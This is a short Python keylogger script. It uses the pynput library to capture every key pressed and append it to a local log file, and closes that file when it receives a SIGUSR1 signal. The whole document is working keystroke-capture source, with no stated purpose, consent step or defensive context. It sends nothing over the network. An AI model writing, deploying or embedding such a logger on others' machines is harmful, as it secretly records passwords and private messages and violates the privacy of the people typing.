#!/usr/bin/env python3

from pynput import keyboard
import signal

file = open("log/log_file.txt", "w")

'''
Function called for signal management
'''
def exit_manage(signum, stack):
    #Closing the file on which keyboard input is written
    #otherwise file will stay empty
    file.close()


'''
Function for evaluation of input keys
'''
def get_key(key):
    if isinstance(key, keyboard.KeyCode):
        return key.char
    else:
        return str(key)

'''
Callback called by listener in 
'''
def press(key):
    #Obtain string of key inserted
    key_name = get_key(key)

    #Write key typed in the file
    file.write('Message: {}\n'.format(key_name))


'''
Main function
'''
def main():
    #Set exit_manage() as callback for SIGUSR1
    signal.signal(signal.SIGUSR1, exit_manage)

    #Listener for keyboard input
    with keyboard.Listener(on_press=press) as listener:
        listener.join()


if __name__=='__main__':
    main()
